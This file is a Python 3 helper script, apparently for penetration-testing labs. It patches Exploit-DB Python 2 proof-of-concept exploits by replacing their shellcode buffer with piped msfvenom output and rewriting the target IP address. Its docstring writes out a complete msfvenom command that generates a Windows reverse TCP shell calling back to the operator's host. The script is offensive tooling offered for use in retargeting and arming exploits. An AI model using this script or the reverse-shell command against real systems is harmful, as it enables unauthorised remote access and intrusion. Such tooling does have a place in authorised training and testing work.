#!/usr/bin/env python3
"""
buf_swap.py -- replace the buf block in any Python 2 Exploit-DB PoC
and optionally patch the hardcoded target IP in server_address.

Usage (pipe msfvenom output directly):

    msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp \\
      LHOST=$LocalIP LPORT=4444 \\
      -e x86/unicode_mixed BufferRegister=EAX -f python \\
      | python3 buf_swap.py /path/to/exploit.py $BoxIP

Arguments:
    exploit.py   Path to the Python 2 PoC to patch (edited in place).
    $BoxIP       New target IP to write into server_address (optional).
                 Omit if the exploit does not use a server_address variable.

stdin:
    The msfvenom -f python output, piped in.

Notes:
  - The regex matches most EDB Python 2 buf formats:
      buf = ""        (one or two spaces)
      buf = b""       (bytes prefix)
      buf += "\x..."
      buf += b"\x..."
  - re.sub is given a lambda replacement to prevent Python treating
    \\x sequences in the shellcode as regex backreferences.
  - In Python 2, b"" and "" are identical, so msfvenom's bytes-style
    output works without modification.
"""

import re
import sys


def main():
    if len(sys.argv) < 2:
        print("Usage: msfvenom ... -f python | python3 buf_swap.py exploit.py [$BoxIP]")
        sys.exit(1)

    exploit_path = sys.argv[1]
    new_ip = sys.argv[2] if len(sys.argv) > 2 else None
    new_buf = sys.stdin.read().strip()

    if not new_buf:
        print("[!] No shellcode received on stdin -- pipe msfvenom -f python output")
        sys.exit(1)

    with open(exploit_path) as f:
        code = f.read()

    # Match any of the common EDB Python 2 buf formats:
    #   buf =  ""          buf = b""
    #   buf += "\x..."     buf += b"\x..."
    pattern = r'buf\s*=\s*b?""\s*\n(?:buf\s*\+=\s*b?"[^"]*"\s*\n)+'

    patched = re.sub(pattern, lambda m: new_buf + "\n", code)

    if patched == code:
        print("[!] FAILED: could not locate buf block. Check the exploit format.")
        sys.exit(1)

    print("[+] buf block replaced")

    if new_ip:
        # Replace whatever IP is in server_address = ('x.x.x.x', ...)
        before = patched
        patched = re.sub(
            r"(server_address\s*=\s*\()['\"][\d.]+['\"]",
            lambda m: m.group(0)[:m.group(0).rfind("'")] + f"'{new_ip}'",
            patched,
        )
        # Simpler fallback: plain string replace of the old IP
        if patched == before:
            import re as _re
            old_ip_match = _re.search(r"server_address\s*=\s*\(['\"](\d[\d.]+)['\"]", code)
            if old_ip_match:
                patched = patched.replace(old_ip_match.group(1), new_ip)

        if new_ip in patched:
            print(f"[+] IP set to {new_ip}")
        else:
            print(f"[!] WARNING: could not locate server_address -- set IP manually")

    with open(exploit_path, "w") as f:
        f.write(patched)

    # Quick verify
    if new_buf[:20] in patched:
        print("[+] Shellcode verified in patched file")
    else:
        print("[!] WARNING: shellcode not found after write -- check the file")

    if new_ip and new_ip in patched:
        print(f"[+] IP verified: {new_ip}")


if __name__ == "__main__":
    main()
